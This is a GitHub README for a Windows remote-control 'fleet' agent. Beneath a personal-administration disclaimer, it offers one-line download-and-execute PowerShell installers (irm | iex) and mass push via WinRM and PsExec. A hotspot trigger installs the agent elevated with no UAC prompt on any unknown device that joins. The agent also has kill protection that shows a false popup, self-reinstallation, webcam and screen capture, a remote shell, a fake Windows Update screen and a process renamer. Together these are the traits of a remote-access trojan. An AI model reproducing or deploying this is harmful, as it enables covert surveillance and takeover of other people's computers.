<div align="center">

<img src="icon-192.png" alt="Project-X-Nano Logo" width="120" style="border-radius:24px; box-shadow: 0 8px 32px rgba(0,0,0,0.4);" />

# ⚡ Project-X-Nano
### *Next-Gen Personal Remote Control & Fleet Management Hub for Windows*

[![Release](https://img.shields.io/badge/Release-v1.0.0--alpha-4f8cff.svg?style=for-the-badge)](https://github.com/mexxz-01/Project-x-alpha)
[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D6.svg?style=for-the-badge&logo=windows)](https://github.com/mexxz-01/Project-x-alpha)
[![Android](https://img.shields.io/badge/Android%20App-Controller%20APK-3ddc97.svg?style=for-the-badge&logo=android)](https://github.com/mexxz-01/Project-x-alpha/raw/main/Project-X-Nano.apk)
[![Security](https://img.shields.io/badge/Security-Scrypt%20%2B%20AES-brightgreen.svg?style=for-the-badge)](https://github.com/mexxz-01/Project-x-alpha)

<p align="center">
  <b>Unified zero-configuration master controller for your PCs and fleet.</b><br>
  No third-party subscriptions. Direct low-latency hardware control. Runs silently as a background service.
</p>

---

> [!CAUTION]
> ### ⚠️ LEGAL DISCLAIMER & TERMS OF USE
> **This project is strictly developed and maintained for personal device administration, remote management of user-owned hardware, and educational/research purposes only.**
>
> - **Zero Liability:** The author (**mexxz-01**) assumes **absolutely no responsibility or liability** for any damages, unauthorized access, computer interference, misuse, or illegal activities conducted with this software, its binaries, or this codebase.
> - **Compliance & Authorization:** Users must strictly comply with all applicable local, national, and international laws, including computer fraud, cybersecurity, and data protection legislation. You must never deploy, execute, or operate this program on any computer system, device, or network that you do not personally own or without explicit, documented permission from the device owner.
> - **Educational Notice:** Created exclusively for personal use and educational learning in systems architecture, cloud orchestration, and remote administration.

---

</div>

## ☁️ 24/7 Serverless Edge Cloud Architecture (Zero Port-Forwarding)

Project-X-Nano operates on a **24/7/365 Serverless Cloud Infrastructure** backed by **Vercel Global Edge** and **Neon Serverless Postgres**:

- **Does the Cloud Server Run 24/7?**  
  **Yes, absolutely.** The cloud backend (`https://project-x-alpha-lake.vercel.app`) runs continuously in the cloud on enterprise serverless infrastructure with 99.99% uptime. It does not depend on your personal computer remaining on to stay active.
- **Automatic PC Auto-Connect:**  
  The moment the PC powers on or connects to the internet, the background agent connects **outbound** over HTTPS to the 24/7 cloud coordinator.
- **Zero Port-Forwarding / NAT Bypass:**  
  No router configuration, port-forwarding rules, UPnP, or static IPs are ever required. Because all traffic is outbound over port 443, it bypasses cellular hotspots, CGNAT, firewalls, and office/home routers automatically.
- **Reverse Command Queue:**  
  Execute remote commands (Lock, Sleep, Restart, Shutdown, Matrix Lock, Fake Update, Remote Terminal, and Live Screen capture) from your phone or browser anywhere in the world. Commands are queued in Neon Postgres and executed natively on the PC with sub-second latency.

> **24/7 Live Cloud Console:** [https://project-x-alpha-lake.vercel.app](https://project-x-alpha-lake.vercel.app)

---

## ⚡ 1-Line Universal Setup (Run on Any Windows PC)

Deploy the full agent to any PC with a single PowerShell command or double-click. It automatically downloads all core binaries from GitHub, starts the agent silently in the background, and connects directly to your **24/7 Neon & Vercel Cloud Hub** (zero Cloudflare, zero port-forwarding, zero timeouts):

### Method A: Single 1-Line PowerShell Command (Recommended)
```powershell
& ([scriptblock]::Create((irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1)))
```

### Method B: 1-Click Batch Installer
1. Download or copy `install_agent.bat` onto the target PC.
2. Double-click **`install_agent.bat`**.
3. It displays the futuristic installation screen, configures autostart and the watchdog shield, and links the device to your central cloud hub automatically!

> **24/7 Central Fleet Console:** [https://project-x-alpha-lake.vercel.app](https://project-x-alpha-lake.vercel.app)  
> **Local Fallback Hub:** `http://localhost:8765`

---

## 🛡️ Anti-Tamper Watchdog & Self-Healing Integrity

Built for durability on shared family PCs:
- **Task Manager Kill Protection:** If a user tries to end `Project-X-Nano` from Task Manager, a native system popup is displayed:  
  `"You need to restart your PC to stop that exe."`  
  and the background service is immediately re-spawned!
- **Self-Healing Integrity Engine:** If critical files (`.exe`, `config.json`) are deleted or tampered with, the watchdog detects the missing files and downloads fresh copies from the GitHub repository in parallel.
- **Persistent Autostart:** Survives reboots via both the Windows Run registry and background watchdog monitoring.

---

## 🚀 Multi-PC Fleet Remote Deployment

Deploy Project-X-Nano across all computers on your local network without manually visiting each machine. Choose either WinRM or PsExec depending on your network setup:

### Method 1: Using PowerShell Remoting (WinRM) — Recommended

PowerShell Remoting allows native push execution across multiple Windows PCs in parallel using built-in Windows Remote Management.

1. **(One-Time Setup on Main PC)**: Start the WinRM service and allow TrustedHosts in PowerShell (Run as Administrator):
   ```powershell
   Start-Service WinRM
   Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
   ```

2. **Run Fleet Deployment Script**:
   ```powershell
   $targetPCs = @("192.168.1.11", "192.168.1.12", "192.168.1.13", "192.168.1.14")
   $cred = Get-Credential  # Enter the username and password for those PCs
   Invoke-Command -ComputerName $targetPCs -Credential $cred -ScriptBlock {
       irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1 | iex
   }
   ```
   *Alternatively, run the built-in helper script:*
   ```powershell
   .\deploy_fleet.ps1
   ```

> **How it works:** `Invoke-Command` connects securely to each PC in `$targetPCs`, executes the universal 1-line installer in memory, configures firewall rules, and launches the background server process on all PCs at once.

---

### Method 2: Using PsExec (Sysinternals)

If target machines have administrator file sharing (`ADMIN$`) enabled:

```cmd
psexec \\192.168.1.11 -u AdminUser -p AdminPassword -d -s powershell -Command "irm https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/setup.ps1 | iex"
```

> **Flag Breakdown:**
> - `\\192.168.1.11` : Target PC IP address or computer name.
> - `-u AdminUser -p AdminPassword` : Administrator credentials for the target PC.
> - `-d` : Detached mode (returns immediately without waiting for process to exit).
> - `-s` : Run as the elevated System account.

---

## 📶 Hotspot Auto-Installer

Deploy the agent automatically the moment any device joins your Windows Mobile Hotspot. Useful for field setups where you want the agent live before you even open a browser.

1. Turn on **Settings → Network & Internet → Mobile hotspot**.
2. Run `hotspot\install_hotspot_trigger.bat` (self-elevates).
3. Optionally paste a Discord webhook when prompted.

The trigger polls the ICS subnet (`192.168.137.0/24`) every 5 seconds. On the first unknown client it runs the standard `setup.ps1` elevated via a `RunLevel Highest` scheduled task — no UAC prompt. If the agent is already present it just respawns the process instead of reinstalling.

- **Log:** `%PROGRAMDATA%\Project-X-Nano\hotspot-trigger.log`
- **Remove:** `hotspot\uninstall_hotspot_trigger.bat`

Requires a Wi-Fi adapter, internet on the host, and a Private network profile on the hotspot interface.

## 📱 Android Controller APK

Control your PC directly from your phone with the dedicated Android app:

- **Direct Download:** [`Project-X-Nano.apk`](https://github.com/mexxz-01/Project-x-alpha/raw/main/Project-X-Nano.apk)
- **From Local Server:** Open `http://<your-pc-ip>:8765/download/apk` on your mobile browser.
- **Features:** Auto-discovers servers, saves master password for 1-tap login, instant background PC lock, real-time screen stream, and fleet switching.

---
## ✨ Features Overview

| Category | Highlights |
|---|---|
| **👥 Multi-PC Fleet Hub** | Manage **5 to 100+ PCs** on your network. Real-time CPU/RAM meters, 1-click machine switching, and broadcast actions (*Emergency Lock All*, *Sleep All*). |
| **🖥️ Live Screen Stream** | High-framerate MJPEG screen stream with tap-to-click remote control directly from your phone. |
| **📹 Live Webcam Stream** | Real-time front and rear camera feeds straight to your browser, with snapshot capture. |
| **💻 Remote Admin Terminal** | Integrated Windows CMD and PowerShell terminal protected by authentication. |
| **🎚️ Hardware Controls** | Smooth volume sliders, DDC/CI monitor brightness, and full media keys. |
| **📁 Multi-Drive Explorer** | Browse `C:\`, `D:\`, USB drives, download files, and upload files remotely. |
| **⚡ Live Process Manager** | Full task manager in your browser. Real-time CPU % & Memory MB meters, filter by name/PID, 1-click **End Task**, **Suspend/Pause**, and **Resume**. |
| **🌐 Network Ports Explorer** | Scan all active listening TCP/UDP sockets, mapped to process names and PIDs. 1-click **Free Port** button to resolve dev port conflicts. |
| **⚙️ Windows Services Hub** | Start, stop, and restart background Windows services and developer daemons directly from mobile or desktop. |
| **📋 Bi-Directional Clipboard** | Instant copy/paste bridge between your phone/laptop and the remote PC clipboard. |
| **🔥 Per-Core CPU Telemetry** | Real-time visual load bars across every logical CPU core with live frequency meters. |
| **🛡️ Fake Windows Update Screen** | 1-click remote guest deterrent. Launches an authentic animated full-screen Windows Update loading screen on the PC. Host keyboard bypass: `mexxz`. |
| **⚡ Matrix Stealth Lock** | Pitch-black screen with animated emerald green digital rain Matrix theme and glowing *PROJECT X* typography. |
| **⏻ Power & Sleep** | Shut down, restart, lock, sleep, hibernate, abort pending shutdowns, and sleep timers. |
| **🗑️ Remote Clean Uninstall** | 1-click remote uninstaller cleans autostart registry, drops scheduled tasks, terminates process, and purges all installation files/folders. |
| **🛡️ Silent Background Process** | Zero black console window; runs cleanly in Windows Task Manager under Background Processes. |

---

## 🛠️ Remote Uninstallation

If you ever need to completely remove Project-X-Nano from a machine:

### Option A: From the Web Dashboard (Remotely)
1. Open the dashboard ➔ Go to **Power / System Maintenance**.
2. Click **`🗑️ Uninstall Project-X-Nano Remotely`**.
3. It will wipe all startup registry keys, scheduled tasks, firewall rules, terminate the background server, and automatically purge all installation folders (`%LOCALAPPDATA%\Project-X-Nano`) with zero leftover trace.

### Option B: Using `uninstall.bat`
1. Double-click `uninstall.bat` in the installation directory.
2. Type `Y` to confirm. It will signal the watchdog, stop all processes cleanly, remove registry keys, and wipe all local files.

### Option C: Local 1-Line Command
```powershell
powershell -Command "Stop-Process -Name Project-X-Nano -Force -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Project-X-Nano' -ErrorAction SilentlyContinue; schtasks /Delete /TN 'Project-X-Nano' /F 2>$null; Remove-Item -Path \"$env:LOCALAPPDATA\Project-X-Nano\" -Recurse -Force -ErrorAction SilentlyContinue"
```

---

## 🏷️ Brand Renamer (For Future Rebranding)

To rename the project and rebuild the `.exe`, `.apk`, and Task Manager process name to anything else in 1 command:

```powershell
python rename.py "YourNewName"
```

---

<div align="center">
  <sub>Developed by <b>mexxz-01</b> • Built for performance, security, and effortless remote access.</sub>
</div>
